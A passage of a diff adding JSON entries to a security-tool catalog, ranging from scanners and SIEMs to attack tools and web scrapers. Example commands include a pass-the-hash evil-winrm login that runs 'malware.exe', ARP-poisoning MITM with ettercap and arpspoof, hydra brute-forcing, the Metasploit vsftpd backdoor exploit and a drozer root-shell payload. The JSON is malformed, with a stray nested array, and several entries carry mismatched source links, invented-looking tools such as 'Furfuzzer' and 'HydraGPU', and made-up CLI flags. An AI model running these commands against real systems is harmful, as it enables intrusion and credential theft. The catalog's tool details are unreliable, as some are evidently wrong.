+      "evil-winrm -i 192.168.1.100 -u admin -H ntlm_hash",
+      "upload /local/file.txt C:\\remote\\file.txt",
+      "download C:\\remote\\file.txt /local/file.txt",
+      "Invoke-Binary C:\\malware.exe"
+    ],
+    "source": "https://github.com/Hackplayers/evil-winrm"
+  },
+  {
+    "name": "OSINT Framework",
+    "description": "OSINT Framework is a collection of tools and resources for reconnaissance and information gathering.",
+    "usage": "Used to find publicly available information about targets, including social media and domains.",
+    "key_features": [
+      "Organized tool categories",
+      "Search engine integration",
+      "Web-based interface",
+      "Links to tools like Shodan",
+      "Regularly updated"
+    ],
+    "example_commands": [
+      "Visit https://osintframework.com/",
+      "Browse categories like people, domains",
+      "Use tools like Shodan, Maltego"
+    ],
+    "source": "https://osintframework.com/"
+  },
+  {
+    "name": "Sn1per",
+    "description": "Sn1per is an automated framework for reconnaissance, scanning, and reporting.",
+    "usage": "Used to automate vulnerability scanning and generate reports.",
+    "key_features": [
+      "Automated workflows",
+      "Integrates Nmap, Nikto",
+      "Multiple scan modes",
+      "Report generation",
+      "Designed for pentesters"
+    ],
+    "example_commands": [
+      "sn1per -t target.com",
+      "sn1per -s",
+      "sn1per -r",
+      "sn1per -h"
+    ],
+    "source": "https://github.com/1N3/Sn1per"
+  },
+  {
+    "name": "ReconSpider",
+    "description": "ReconSpider automates harvesting subdomains, emails, and other data from various sources.",
+    "usage": "Used for information gathering, including subdomain enumeration.",
+    "key_features": [
+      "Multiple search engines",
+      "Subdomain/email enumeration",
+      "Shodan, Censys APIs",
+      "Configurable output",
+      "Automated/manual modes"
+    ],
+    "example_commands": [
+      "reconspider -d example.com -o output.txt",
+      "reconspider --shodan API_KEY -d example.com",
+      "reconspider --censys -d example.com"
+    ],
+    "source": "https://github.com/cachethq/reconspider"
+  },
+  {
+    "name": "Acunetix",
+    "description": "Acunetix is an automated web vulnerability scanner for SQL injection, XSS, and other issues.",
+    "usage": "Used in web application security assessments.",
+    "key_features": [
+      "Automated scanning",
+      "Complex web app support",
+      "Detects injections, XSS",
+      "Reporting",
+      "CI/CD integration"
+    ],
+    "example_commands": [
+      "Configure Acunetix dashboard",
+      "Set target URLs",
+      "Run scans and review reports"
+    ],
+    "source": "https://www.acunetix.com/"
+  },
+  {
+    "name": "XRF",
+    "description": "XRF is a tool for identifying and exploiting XSS vulnerabilities in web applications.",
+    "usage": "Used to detect stored and reflected XSS flaws.",
+    "key_features": [
+      "Automated XSS detection",
+      "Payload injection",
+      "Cross-browser testing",
+      "Reporting",
+      "Custom payloads"
+    ],
+    "example_commands": [
+      "xrf -u http://targetsite.com -p 'payload'",
+      "xrf --scan --target http://targetsite.com",
+      "xrf -h"
+    ],
+    "source": "https://github.com/po1ntballer/xssrecon"
+  },
+  {
+    "name": "Sublist3r",
+    "description": "Sublist3r is a fast subdomain enumeration tool using search engines and DNS queries.",
+    "usage": "Used for reconnaissance to identify subdomains.",
+    "key_features": [
+      "Search engine integration",
+      "DNS brute-force",
+      "Multiple output formats",
+      "Parallel processing",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "sublist3r -d example.com -o subdomains.txt",
+      "sublist3r -d example.com -n -t 50",
+      "sublist3r -d example.com -b google,bing,baidu"
+    ],
+    "source": "https://github.com/aboul3la/Sublist3r"
+  },
+  {
+    "name": "Masscan",
+    "description": "Masscan is an ultra-fast port scanner for large IP ranges.",
+    "usage": "Used for reconnaissance to identify open ports quickly.",
+    "key_features": [
+      "Fast scanning",
+      "TCP, UDP, SCTP support",
+      "Rate limiting",
+      "XML, JSON output",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "masscan -p1-65535 192.168.1.0/24 -oX scan.xml",
+      "masscan -p80,443 192.168.1.0/24 --rate=10000",
+      "masscan --banners -iL targets.txt"
+    ],
+    "source": "https://github.com/robertdavidgraham/masscan"
+  },
+  {
+    "name": "Arachni",
+    "description": "Arachni is a web application security scanner with plugin-based architecture.",
+    "usage": "Used to scan web apps for vulnerabilities like injections.",
+    "key_features": [
+      "Multiplatform",
+      "Plugin architecture",
+      "AJAX support",
+      "Actionable reports",
+      "GUI/CLI options"
+    ],
+    "example_commands": [
+      "arachni http://target.com --output-only-positives",
+      "arachni report:generate --reporter=detailed file:report.afr",
+      "arachni --analyze-redirects"
+    ],
+    "source": "https://github.com/Arachni/arachni"
+  },
+  {
+    "name": "OWASP Dependency-Check",
+    "description": "OWASP Dependency-Check identifies project dependencies with known vulnerabilities.",
+    "usage": "Used for code review to find vulnerable libraries.",
+    "key_features": [
+      "Multi-language support",
+      "Detailed reports",
+      "CI/CD integration",
+      "NVD database",
+      "CLI/plugins"
+    ],
+    "example_commands": [
+      "dependency-check --project myapp --scan ./",
+      "dependency-check --scan target.jar",
+      "dependency-check --format JSON"
+    ],
+    "source": "https://github.com/jeremylong/DependencyCheck"
+  },
+  {
+    "name": "Commix",
+    "description": "Commix automates detection of command injection vulnerabilities in web applications.",
+    "usage": "Used to detect command injection flaws.",
+    "key_features": [
+      "Multiple injection techniques",
+      "Automated exploitation",
+      "GET/POST support",
+      "Plugin extensible",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "commix -u http://target.com/vulnerable.php?param=1",
+      "commix -u http://target.com -p 'ping 127.0.0.1'",
+      "commix --test"
+    ],
+    "source": "https://github.com/commixproject/commix"
+  },
+  {
+    "name": "EyeWitness",
+    "description": "EyeWitness takes screenshots of websites for reconnaissance and reporting.",
+    "usage": "Used to capture visual evidence of target sites.",
+    "key_features": [
+      "Automated screenshots",
+      "Multiple browsers",
+      "Organized output",
+      "Headless support",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "eyewitness -d targets.txt -f",
+      "eyewitness --headless -d urls.txt",
+      "eyewitness -f report.html"
+    ],
+    "source": "https://github.com/ChrisTruncer/EyeWitness"
+  },
+  {
+    "name": "Joker",
+    "description": "Joker is a web vulnerability scanner for detecting OWASP Top 10 vulnerabilities.",
+    "usage": "Used for customized web application security assessments.",
+    "key_features": [
+      "Injection testing",
+      "Custom payloads",
+      "Multiple protocols",
+      "Automated scanning",
+      "Scripting support"
+    ],
+    "example_commands": [
+      "joker -u http://target.com",
+      "joker --payload 'custom_payload'",
+      "joker -t 10 -v"
+    ],
+    "source": "https://github.com/s0md3v/joker"
+  },
+  {
+    "name": "Furfuzzer",
+    "description": "Furfuzzer is a web application fuzzer for testing vulnerabilities with crafted payloads.",
+    "usage": "Used to uncover injection points and other web vulnerabilities.",
+    "key_features": [
+      "Custom payloads",
+      "Automated discovery",
+      "GET/POST support",
+      "Plugin extensible",
+      "Detailed reports"
+    ],
+    "example_commands": [
+      "furfuzzer -u http://target.com",
+      "furfuzzer -u http://target.com -p payloads.txt",
+      "furfuzzer -u http://target.com --methods GET,POST"
+    ],
+    "source": "https://github.com/furfuzzer/furfuzzer"
+  },
+  {
+    "name": "AutoRecon",
+    "description": "AutoRecon automates multi-stage scanning and vulnerability detection.",
+    "usage": "Used to streamline enumeration and vulnerability assessment.",
+    "key_features": [
+      "Automates scanning",
+      "Integrates Nmap, Nikto",
+      "Parallel execution",
+      "Report summaries",
+      "Configurable workflows"
+    ],
+    "example_commands": [
+      "autorecon -h",
+      "autorecon -d example.com",
+      "autorecon -d example.com -o report.html"
+    ],
+    "source": "https://github.com/Tib3rius/AutoRecon"
+  },
+  {
+    "name": "SMBclient",
+    "description": "SMBclient is a command-line tool for interacting with SMB/CIFS shares.",
+    "usage": "Used for enumerating and accessing SMB shares during post-exploitation.",
+    "key_features": [
+      "Lists SMB shares",
+      "File access",
+      "SMB1, SMB2, SMB3 support",
+      "Authentication",
+      "Lateral movement"
+    ],
+    "example_commands": [
+      "smbclient -L //target -U user",
+      "smbclient //target/share -U user",
+      "smbclient //target/share -U user%password"
+    ],
+    "source": "https://www.samba.org/samba/docs/current/man-html/smbclient.1.html"
+  },
+  {
+    "name": "Ettercap",
+    "description": "Ettercap is a suite for man-in-the-middle attacks on LAN, sniffing and intercepting traffic.",
+    "usage": "Used for MITM attacks to capture passwords or modify traffic.",
+    "key_features": [
+      "Active/passive sniffing",
+      "ARP poisoning",
+      "Protocol analysis",
+      "Filtering scripts",
+      "GUI/CLI modes"
+    ],
+    "example_commands": [
+      "ettercap -T -q -i wlan0 -M arp:remote /192.168.1.1// /192.168.1.100//",
+      "ettercap -G"
+    ],
+    "source": "https://github.com/Ettercap/ettercap"
+  },
+  {
+    "name": "Fscan",
+    "description": "Fscan is a fast multi-threaded port scanner for network reconnaissance.",
+    "usage": "Used to scan large IP ranges for open ports.",
+    "key_features": [
+      "Multi-threaded",
+      "TCP connect scan",
+      "Banner grabbing",
+      "IP range scanning",
+      "Multiple output formats"
+    ],
+    "example_commands": [
+      "fscan -iL targets.txt -o results.txt",
+      "fscan -t 1000 -p 1-65535 192.168.1.0/24"
+    ],
+    "source": "https://github.com/shadow1ng/fscan"
+  },
+  {
+    "name": "ZMap",
+    "description": "ZMap is a network scanner for rapid scanning of large IP ranges or the Internet.",
+    "usage": "Used for large-scale network reconnaissance.",
+    "key_features": [
+      "High-speed scanning",
+      "Custom probes",
+      "IPv4 support",
+      "Export results",
+      "Research-focused"
+    ],
+    "example_commands": [
+      "zmap -p 80,443 -o results.csv 192.168.1.0/24",
+      "zmap -p 22 --target-file=targets.txt"
+    ],
+    "source": "https://zmap.io/"
+  },
+  {
+    "name": "Havij",
+    "description": "Havij is an automated SQL injection tool with a GUI for exploiting vulnerabilities.",
+    "usage": "Used to automate SQL injection detection in web apps.",
+    "key_features": [
+      "Automated detection",
+      "Login bypass",
+      "Multiple injection types",
+      "Detailed reports",
+      "GUI interface"
+    ],
+    "example_commands": [
+      "Launch Havij GUI",
+      "Input target URL",
+      "Analyze vulnerabilities"
+    ],
+    "source": "https://www.havij.com/"
+  },
+  {
+    "name": "WPScan",
+    "description": "WPScan is a WordPress security scanner for detecting vulnerabilities and insecure plugins/themes.",
+    "usage": "Used to scan WordPress sites for security issues.",
+    "key_features": [
+      "Vulnerability detection",
+      "Plugin/theme scanning",
+      "Brute-force attacks",
+      "WordPress-specific",
+      "Metasploit integration"
+    ],
+    "example_commands": [
+      "wpscan --url http://targetwordpress.com --enumerate vp",
+      "wpscan --api-token TOKEN --url http://targetwordpress.com"
+    ],
+    "source": "https://wpscan.com/"
+  },
+  {
+    "name": "RouterSploit",
+    "description": "RouterSploit is an exploit framework for testing embedded devices and routers.",
+    "usage": "Used to assess router and device vulnerabilities.",
+    "key_features": [
+      "Supports popular routers",
+      "Exploits default credentials",
+      "New exploit search",
+      "Custom modules",
+      "Automated testing"
+    ],
+    "example_commands": [
+      "routersploit -m scanners/router_os",
+      "search exploits",
+      "use exploits/router_os/cve_XXXX"
+    ],
+    "source": "https://github.com/threat9/routersploit"
+  },
+  {
+    "name": "Cryptool",
+    "description": "Cryptool is a tool for learning and analyzing cryptography and cryptanalysis.",
+    "usage": "Used to study encryption and perform cryptanalysis.",
+    "key_features": [
+      "Classical/modern algorithms",
+      "Cryptanalysis tools",
+      "Encryption/decryption",
+      "Brute-force simulation",
+      "Educational use"
+    ],
+    "example_commands": [
+      "Encrypt with AES",
+      "Brute-force Caesar cipher",
+      "Analyze cipher strength"
+    ],
+    "source": "https://www.cryptool.org/"
+  },
+  {
+    "name": "HydraGPU",
+    "description": "HydraGPU is a GPU-accelerated version of Hydra for rapid brute-force attacks.",
+    "usage": "Used for high-speed brute-forcing with GPU power.",
+    "key_features": [
+      "GPU acceleration",
+      "Multiple protocols",
+      "Parallel processing",
+      "Customizable lists",
+      "High throughput"
+    ],
+    "example_commands": [
+      "hydra -C attack_list.txt -t 64 -o results.txt targetprotocol://target",
+      "Supports multiple GPUs"
+    ],
+    "source": "https://github.com/vanhauser-thc/thc-hydra"
+  },
+  {
+    "name": "John the Ripper Jumbo",
+    "description": "John the Ripper Jumbo supports additional hash types and GPU-based cracking.",
+    "usage": "Used for cracking password hashes with large wordlists.",
+    "key_features": [
+      "Over 400 hash types",
+      "GPU support",
+      "Flexible attack modes",
+      "Customizable rules",
+      "Cross-platform"
+    ],
+    "example_commands": [
+      "john --wordlist=/usr/share/wordlists/rockyou.txt hashfile",
+      "john --format=nt hashfile",
+      "john --incremental hashfile"
+    ],
+    "source": "https://github.com/openwall/john"
+  },
+  {
+    "name": "Keystore Explorer",
+    "description": "Keystore Explorer is a GUI tool for managing keystores and certificates.",
+    "usage": "Used for cryptographic key management and signing.",
+    "key_features": [
+      "Manages keystores",
+      "PKCS12, JKS support",
+      "Signs/verifies data",
+      "Import/export certificates",
+      "GUI interface"
+    ],
+    "example_commands": [
+      "Create new keystore",
+      "Import certificate",
+      "Sign data"
+    ],
+    "source": "https://keystore-explorer.org/"
+  },
+  {
+    "name": "Nexpose",
+    "description": "Nexpose is a vulnerability management tool for scanning networks and web apps.",
+    "usage": "Used to identify and prioritize security weaknesses.",
+    "key_features": [
+      "Automated scanning",
+      "Threat intelligence",
+      "Risk scoring",
+      "Web dashboard",
+      "Metasploit integration"
+    ],
+    "example_commands": [
+      "Configure scan policy",
+      "Start network scan",
+      "Generate compliance reports"
+    ],
+    "source": "https://www.rapid7.com/products/nexpose/"
+  },
+  {
+    "name": "Fuzzbunch",
+    "description": "Fuzzbunch is a post-exploitation framework for deploying tools like DoublePulsar.",
+    "usage": "Used for advanced post-exploitation and fuzzing attacks.",
+    "key_features": [
+      "Modular architecture",
+      "DoublePulsar support",
+      "Custom payloads",
+      "Remote control",
+      "Scripting"
+    ],
+    "example_commands": [
+      "Deploy DoublePulsar",
+      "Run privilege escalation",
+      "Execute remote commands"
+    ],
+    "source": "https://github.com/trustedsec/fuzzbunch"
+  },
+  {
+    "name": "Burp Suite Intruder",
+    "description": "Burp Suite Intruder automates customized attacks like brute-forcing and fuzzing.",
+    "usage": "Used for web application testing to inject payloads.",
+    "key_features": [
+      "Custom payloads",
+      "Multi-parameter attacks",
+      "Brute-forcing",
+      "Fuzzing",
+      "Macros/sequencing"
+    ],
+    "example_commands": [
+      "Configure Intruder payloads",
+      "Start login form attack",
+      "Review responses"
+    ],
+    "source": "https://portswigger.net/burp/documentation/enterprise/intruder"
+  },
+  {
+    "name": "ARPspoof",
+    "description": "ARPspoof is a tool for ARP cache poisoning to enable MITM attacks.",
+    "usage": "Used to intercept traffic by poisoning ARP caches.",
+    "key_features": [
+      "Multiple targets",
+      "IPv4 support",
+      "Continuous poisoning",
+      "Packet sniffer integration",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "arpspoof -t 192.168.1.100 -r 192.168.1.1",
+      "arpspoof -i wlan0 -t 192.168.1.105 -r 192.168.1.1"
+    ],
+    "source": "https://github.com/evil-lim/arpspoof"
+  },
+  {
+    "name": "FlowMeter",
+    "description": "FlowMeter is a network traffic flow monitor for detecting anomalies.",
+    "usage": "Used to monitor traffic patterns and detect attacks.",
+    "key_features": [
+      "High-speed capture",
+      "NetFlow/IPFIX support",
+      "Real-time analysis",
+      "Anomaly detection",
+      "Visualization export"
+    ],
+    "example_commands": [
+      "FlowMeter -i eth0 -o output.json",
+      "FlowMeter --detect-anomalies"
+    ],
+    "source": "https://github.com/FlowMeter/FlowMeter"
+  },
+  {
+    "name": "OWASP AppSensor",
+    "description": "OWASP AppSensor is a real-time attack detection system for web applications.",
+    "usage": "Integrated into web apps for attack detection and alerting.",
+    "key_features": [
+      "Custom detection rules",
+      "Real-time monitoring",
+      "Event logging",
+      "Web framework support",
+      "Threshold rules"
+    ],
+    "example_commands": [
+      "Configure detection rules",
+      "Monitor live traffic",
+      "Trigger alerts"
+    ],
+    "source": "https://owasp.org/www-project-appsensor/"
+  },
+  {
+    "name": "Snort",
+    "description": "Snort is an open-source network IDS/IPS for real-time traffic analysis.",
+    "usage": "Used for network security monitoring and attack detection.",
+    "key_features": [
+      "Signature-based detection",
+      "Packet logging",
+      "Custom rules",
+      "Inline IPS",
+      "Community updates"
+    ],
+    "example_commands": [
+      "snort -c /etc/snort/snort.conf -A console",
+      "Enable inline IPS",
+      "Update Snort rules"
+    ],
+    "source": "https://www.snort.org/"
+  },
+  {
+    "name": "Suricata",
+    "description": "Suricata is a high-performance IDS/IPS with deep packet inspection.",
+    "usage": "Used for network intrusion detection and prevention.",
+    "key_features": [
+      "Signature/anomaly detection",
+      "JSON output",
+      "Inline IPS",
+      "Multi-threaded",
+      "Rule updates"
+    ],
+    "example_commands": [
+      "suricata -c /etc/suricata/suricata.yaml -i eth0",
+      "Generate JSON alerts",
+      "Update rules"
+    ],
+    "source": "https://suricata.io/"
+  },
+  {
+    "name": "Prowler",
+    "description": "Prowler is an AWS security assessment tool for auditing best practices.",
+    "usage": "Used to evaluate AWS accounts for misconfigurations.",
+    "key_features": [
+      "AWS best practice checks",
+      "CIS benchmarks",
+      "IAM, S3, EC2 reports",
+      "AWS CLI support",
+      "Customizable rules"
+    ],
+    "example_commands": [
+      "prowler -b",
+      "prowler -M check71",
+      "prowler -c config_file"
+    ],
+    "source": "https://github.com/toniblyx/prowler"
+  },
+  {
+    "name": "CloudSploit",
+    "description": "CloudSploit is a cloud security scanner for AWS, GCP, and Azure.",
+    "usage": "Used to detect misconfigurations in cloud environments.",
+    "key_features": [
+      "Multi-cloud support",
+      "Insecure configuration detection",
+      "Scheduled scans",
+      "Risk reports",
+      "CI/CD integration"
+    ],
+    "example_commands": [
+      "cloudsploit audit",
+      "cloudsploit-aws -r account-region",
+      "Schedule scans via CI/CD"
+    ],
+    "source": "https://github.com/aquasecurity/cloudsploit"
+  },
+  {
+    "name": "Splunk",
+    "description": "Splunk is a platform for searching and analyzing machine-generated data.",
+    "usage": "Used for SIEM, log analysis, and real-time alerting.",
+    "key_features": [
+      "Real-time ingestion",
+      "Custom dashboards",
+      "Multiple data sources",
+      "Search/analytics",
+      "Security tool integration"
+    ],
+    "example_commands": [
+      "Search logs for anomalies",
+      "Create custom alerts",
+      "Generate dashboards"
+    ],
+    "source": "https://www.splunk.com/"
+  },
+  {
+    "name": "AlienVault OSSIM",
+    "description": "AlienVault OSSIM is an open-source SIEM with intrusion detection and asset discovery.",
+    "usage": "Used for centralized security monitoring.",
+    "key_features": [
+      "IDS/IPS integration",
+      "Asset discovery",
+      "Correlation engine",
+      "Vulnerability assessment",
+      "Event logging"
+    ],
+    "example_commands": [
+      "Deploy OSSIM sensor",
+      "Configure alerts",
+      "Review dashboards"
+    ],
+    "source": "https://www.alienvault.com/open-threat-exchange"
+  },
+  {
+    "name": "Caine",
+    "description": "Caine is a Linux live distribution for digital forensics and incident response.",
+    "usage": "Used to investigate compromised systems and analyze disk images.",
+    "key_features": [
+      "Forensic tools",
+      "Live analysis",
+      "Hashing/data carving",
+      "RAM analysis",
+      "Easy to boot"
+    ],
+    "example_commands": [
+      "Boot Caine live media",
+      "Hash files",
+      "Analyze memory dumps"
+    ],
+    "source": "https://www.caine-live.net/"
+  },
+  {
+    "name": "Kali Linux",
+    "description": "Kali Linux is a Debian-based distribution with tools for penetration testing.",
+    "usage": "Used for comprehensive security testing and exploitation.",
+    "key_features": [
+      "Pre-installed tools",
+      "Wireless testing",
+      "Automated scans",
+      "Metasploit support",
+      "Customizable"
+    ],
+    "example_commands": [
+      "Run nmap scans",
+      "Use Metasploit",
+      "Wireless testing with Aircrack-ng"
+    ],
+    "source": "https://www.kali.org/"
+  },
+  {
+    "name": "Parrot Security OS",
+    "description": "Parrot Security OS is a Linux distribution for security and privacy.",
+    "usage": "Used for pentesting, forensics, and auditing.",
+    "key_features": [
+      "Forensic tools",
+      "Anonymity tools",
+      "Security tools",
+      "Vulnerability analysis",
+      "Lightweight"
+    ],
+    "example_commands": [
+      "Run reconnaissance tools",
+      "Use Burp Suite",
+      "Perform escalation audits"
+    ],
+    "source": "https://www.parrotsec.org/"
+  },
+  {
+    "name": "BackBox Linux",
+    "description": "BackBox is a Ubuntu-based distribution for security assessments.",
+    "usage": "Used for pentesting and network analysis.",
+    "key_features": [
+      "Security tools",
+      "Vulnerability assessment",
+      "Network analysis",
+      "Customizable",
+      "Lightweight"
+    ],
+    "example_commands": [
+      "Use nmap, Nessus",
+      "Run Metasploit",
+      "Conduct audits"
+    ],
+    "source": "https://www.backbox.org/"
+  },
+  {
+    "name": "DEFT Linux",
+    "description": "DEFT Linux is a distribution for forensics and incident response.",
+    "usage": "Used for forensic investigations and security assessments.",
+    "key_features": [
+      "Forensic tools",
+      "Live distribution",
+      "Disk/memory analysis",
+      "Hashing/recovery",
+      "Incident response"
+    ],
+    "example_commands": [
+      "Boot DEFT live media",
+      "Hash verification",
+      "Analyze disk images"
+    ],
+    "source": "https://deftlinux.net/"
+  },
+  {
+    "name": "Samurai Web Testing Framework",
+    "description": "Samurai is a live Linux environment for web penetration testing.",
+    "usage": "Used for web app and server security testing.",
+    "key_features": [
+      "Pre-installed tools",
+      "Web vulnerability discovery",
+      "Portable",
+      "Network testing",
+      "Easy deployment"
+    ],
+    "example_commands": [
+      "Boot Samurai live media",
+      "Run web scans",
+      "Test server configs"
+    ],
+    "source": "https://github.com/SamuraiWTF/samuraiwtf"
+  },
+  {
+    "name": "BlackArch Linux",
+    "description": "BlackArch is an Arch Linux-based distribution for security researchers.",
+    "usage": "Used for pentesting and security assessments.",
+    "key_features": [
+      "Extensive toolkit",
+      "Arch Linux base",
+      "Custom scripting",
+      "Regular updates",
+      "Pentesting tasks"
+    ],
+    "example_commands": [
+      "pacman -Syyu",
+      "Use Armitage, Metasploit",
+      "Perform audits"
+    ],
+    "source": "https://www.blackarch.org/"
+  },
+  {
+    "name": "Tails",
+    "description": "Tails is a live Linux distribution for privacy and anonymity.",
+    "usage": "Used for secure testing and incident response.",
+    "key_features": [
+      "Anonymous browsing",
+      "Encryption tools",
+      "Volatile OS",
+      "Forensic support",
+      "Security tools"
+    ],
+    "example_commands": [
+      "Boot Tails from USB",
+      "Use Tor, VPN",
+      "Perform forensics"
+    ],
+    "source": "https://tails.boum.org/"
+  },
+  {
+    "name": "CMSmap",
+    "description": "CMSmap is an automated scanner for CMS platforms like WordPress and Joomla.",
+    "usage": "Used to find CMS-specific vulnerabilities.",
+    "key_features": [
+      "Multiple CMS support",
+      "Outdated plugin detection",
+      "SQLi, XSS detection",
+      "Brute-force testing",
+      "Detailed reports"
+    ],
+    "example_commands": [
+      "cmsmap -u http://target.com",
+      "cmsmap -u http://target.com -T 5",
+      "Run vulnerability scans"
+    ],
+    "source": "https://github.com/Dionach/CMSmap"
+  },
+  {
+    "name": "OSSEC",
+    "description": "OSSEC is a host-based IDS for monitoring and analyzing security events.",
+    "usage": "Used for log analysis and intrusion detection.",
+    "key_features": [
+      "Log analysis",
+      "File integrity",
+      "Rootkit detection",
+      "Real-time alerts",
+      "Active response"
+    ],
+    "example_commands": [
+      "Configure OSSEC agents",
+      "Monitor alerts",
+      "Set detection rules"
+    ],
+    "source": "https://www.ossec.net/"
+  },
+  {
+    "name": "Wazuh",
+    "description": "Wazuh is a security monitoring platform based on OSSEC with extended features.",
+    "usage": "Used for SIEM, intrusion detection, and compliance.",
+    "key_features": [
+      "Real-time log analysis",
+      "Threat detection",
+      "File integrity",
+      "Vulnerability checks",
+      "Dashboard"
+    ],
+    "example_commands": [
+      "Configure Wazuh agents",
+      "Monitor dashboard",
+      "Integrate with SIEM"
+    ],
+    "source": "https://wazuh.com/"
+  },
+  {
+    "name": "Sysmon",
+    "description": "Sysmon is a Windows tool for logging system activity.",
+    "usage": "Used for process, network, and file monitoring.",
+    "key_features": [
+      "Process logging",
+      "Network monitoring",
+      "File events",
+      "Driver events",
+      "Custom filtering"
+    ],
+    "example_commands": [
+      "Configure Sysmon config",
+      "Analyze logs in Event Viewer",
+      "Identify suspicious activity"
+    ],
+    "source": "https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon"
+  },
+  {
+    "name": "OSQuery",
+    "description": "OSQuery is an OS instrumentation framework for querying system metrics.",
+    "usage": "Used for auditing and intrusion detection.",
+    "key_features": [
+      "Cross-platform",
+      "SQL-based queries",
+      "Real-time monitoring",
+      "System schema",
+      "Custom queries"
+    ],
+    "example_commands": [
+      "osqueryi --json 'SELECT * FROM processes WHERE name = \"malicious.exe\";'",
+      "Schedule compliance queries",
+      "Integrate with SIEM"
+    ],
+    "source": "https://osquery.io/"
+  },
+  {
+    "name": "Falco",
+    "description": "Falco is a runtime security tool for Kubernetes and containers.",
+    "usage": "Used to detect anomalous behavior in cloud-native environments.",
+    "key_features": [
+      "Behavioral monitoring",
+      "Process execution detection",
+      "File modifications",
+      "Network anomalies",
+      "Custom rules"
+    ],
+    "example_commands": [
+      "Deploy Falco in Kubernetes cluster",
+    "Configure custom detection rules",
+    "Monitor alerts via logs or SIEM integration"
+  ],
+  "source": "https://falco.org/"
+  },
+  {
+    "name": "Drozer",
+    "description": "Drozer is an open-source security assessment tool for Android applications, used to identify vulnerabilities and misconfigurations.",
+    "usage": "Used to perform security testing on Android apps, including privilege escalation and data exposure checks.",
+    "key_features": [
+      "Dynamic analysis",
+      "App component enumeration",
+      "Inter-process communication testing",
+      "Customizable modules",
+      "CLI interface"
+    ],
+    "example_commands": [
+      "drozer console connect",
+      "run app.activity.info -a com.example.app",
+      "run app.provider.query content://com.example.provider",
+      "run scanner.misc.readablefiles /data/data/com.example.app",
+      "run exploit.root.generic --payload shell"
+    ],
+    "source": "https://github.com/WithSecureLabs/drozer"
+  },
+  {
+    "name": "MobSF",
+    "description": "Mobile Security Framework (MobSF) is an automated, all-in-one mobile application (Android/iOS) security testing framework.",
+    "usage": "Used to analyze mobile apps for vulnerabilities, including static and dynamic analysis.",
+    "key_features": [
+      "Static and dynamic analysis",
+      "Supports APK, IPA, and source code",
+      "Identifies insecure permissions",
+      "Web-based interface",
+      "Detailed reports"
+    ],
+    "example_commands": [
+      "mobsf --static /path/to/app.apk",
+      "mobsf --dynamic /path/to/app.apk",
+      "python3 manage.py runserver",
+      "mobsf --report pdf /path/to/app.apk",
+      "mobsf --scan /path/to/source_code"
+    ],
+    "source": "https://github.com/MobSF/Mobile-Security-Framework-MobSF"
+  },
+  {
+    "name": "YARA",
+    "description": "YARA is a pattern-matching tool for identifying and classifying malware based on rules.",
+    "usage": "Used for malware analysis and detection during forensic investigations.",
+    "key_features": [
+      "Custom rule creation",
+      "Pattern matching",
+      "Supports binary and text",
+      "Cross-platform",
+      "Integrates with other tools"
+    ],
+    "example_commands": [
+      "yara rules.yar sample.exe",
+      "yara -r rules.yar /path/to/directory",
+      "yara -s rules.yar sample.bin",
+      "yara -p 4 rules.yar sample.exe",
+      "yara -d var=value rules.yar sample.exe"
+    ],
+    "source": "https://github.com/VirusTotal/yara"
+  },
+  {
+    "name": "Metasploitable",
+    "description": "Metasploitable is an intentionally vulnerable virtual machine for practicing penetration testing and exploit development.",
+    "usage": "Used as a target environment to test exploits and learn attack techniques.",
+    "key_features": [
+      "Pre-configured vulnerabilities",
+      "Multiple services (SMB, FTP, SSH)",
+      "Supports network attacks",
+      "Training environment",
+      "VM-based deployment"
+    ],
+    "example_commands": [
+      "Deploy Metasploitable VM in VirtualBox",
+      "nmap -sV 192.168.1.100",
+      "msfconsole; use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.1.100; exploit",
+      "hydra -l root -P passwords.txt 192.168.1.100 ssh",
+      "sqlmap -u http://192.168.1.100/dvwa/vulnerabilities/sqli/ --dbs"
+    ],
+    "source": "https://docs.rapid7.com/metasploit/metasploitable-2/"
+  },
+  [
+  {
+    "name": "ZenRows",
+    "description": "ZenRows is an all-in-one web scraping API and toolkit that simplifies data extraction with premium proxy rotation, headless browsing, and anti-bot bypassing capabilities, accessible via terminal-based API calls.",
+    "usage": "Used for scraping dynamic websites, handling CAPTCHAs, and extracting data for e-commerce, market research, and lead generation with minimal setup.",
+    "key_features": [
+      "Premium rotating proxies for anti-bot evasion",
+      "Headless browser support for JavaScript rendering",
+      "Automatic CAPTCHA and anti-bot bypassing",
+      "Flexible geo-targeting and request header optimization",
+      "Single API call for simplified scraping",
+      "Compatible with Python, Node.js, and cURL"
+    ],
+    "example_commands": [
+      "curl 'https://api.zenrows.com/v1/?apikey=YOUR_API_KEY&url=https://example.com&js_render=true' # Scrape a dynamic website with JavaScript rendering",
+      "pip install zenrows # Install ZenRows Python SDK",
+      "python -c \"from zenrows import ZenRowsClient; client = ZenRowsClient('YOUR_API_KEY'); response = client.get('https://example.com'); print(response.text)\" # Scrape using Python SDK",
+      "curl 'https://api.zenrows.com/v1/?apikey=YOUR_API_KEY&url=https://amazon.com&premium_proxy=true' # Scrape Amazon with premium proxies",
+      "node -e \"const { ZenRows } = require('zenrows'); const client = new ZenRows('YOUR_API_KEY'); client.get('https://example.com').then(res => console.log(res.data));\" # Scrape using Node.js SDK"
+    ],
+    "source": "https://www.zenrows.com"
+  },
+  {
+    "name": "Selenium",
+    "description": "Selenium is an open-source browser automation library for scraping dynamic web content, supporting multiple browsers and programmable via Python, Java, and other languages.",
+    "usage": "Used for scraping JavaScript-heavy websites, automating user interactions, and bypassing CAPTCHAs by simulating real browser behavior.",
+    "key_features": [
+      "Cross-browser support (Chrome, Firefox, Edge, Safari)",
+      "Handles dynamic content and JavaScript rendering",
+      "Supports automation of user actions (clicks, forms)",
+      "Grid system for parallel scraping",
+      "Active community with extensive documentation",
+      "Integrates with headless browsers for scalability"
+    ],
+    "example_commands": [
+      "pip install selenium # Install Selenium Python library",
+      "python -c \"from selenium import webdriver; driver = webdriver.Chrome(); driver.get('https://example.com'); print(driver.page_source); driver.quit()\" # Scrape a webpage using Chrome",
+      "python -c \"from selenium import webdriver; options = webdriver.ChromeOptions(); options.add_argument('--headless'); driver = webdriver.Chrome(options=options); driver.get('https://example.com'); print(driver.title); driver.quit()\" # Scrape in headless mode",
+      "webdriver-manager chrome # Install ChromeDriver automatically",
